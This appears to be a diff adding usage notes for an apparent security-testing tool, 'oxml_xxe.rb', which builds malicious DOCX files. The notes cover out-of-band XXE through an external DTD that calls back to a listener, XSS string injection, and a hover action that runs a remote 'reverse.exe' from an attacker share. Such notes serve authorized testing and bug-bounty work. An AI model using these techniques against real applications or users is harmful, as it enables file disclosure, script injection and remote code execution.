@@ -1,0 +1,25 @@
+Demo 1:
+- Use External DTD in DOCX to verify XXE attack
+1. Start listener 'python -m SimpleHTTPServer'
+2. Build DOCX from sample.docx
+- $. ruby oxml_xxe.rb -b -f ./samples/sample.docx
+-- select 'PUBLIC DTD'
+-- add IP from step 1 (e.g. "192.168.14.1:8000")
+-- select '_rels/.rels' file (i.e. first file parsed in OXML)
+3. Upload/Parse file with vulnerable application
+
+Demo 2:
+- Insert Bad Characters via XE for XSS testing
+$. ruby oxml_xxe.rb -s -f ./samples/complex.docx
+
+Demo 3:
+- Grab from file containing XSS strings and insert into DOCX
+$. ruby oxml_xxe.rb -z ~/Documents/xss.txt  -f ./samples/complex.docx
+
+Demo 4:
+- Use hlinkHover with pptaction to execute remote program (//[IP]/SHARE/reverse.exe) by a user hovering over an image
+
+DOCX Overview:
+http://openxmldeveloper.org/blog/b/openxmldeveloper/archive/2011/10/13/getting-started-with-open-xml-development.aspx
+
+Facebook Bug Bounty
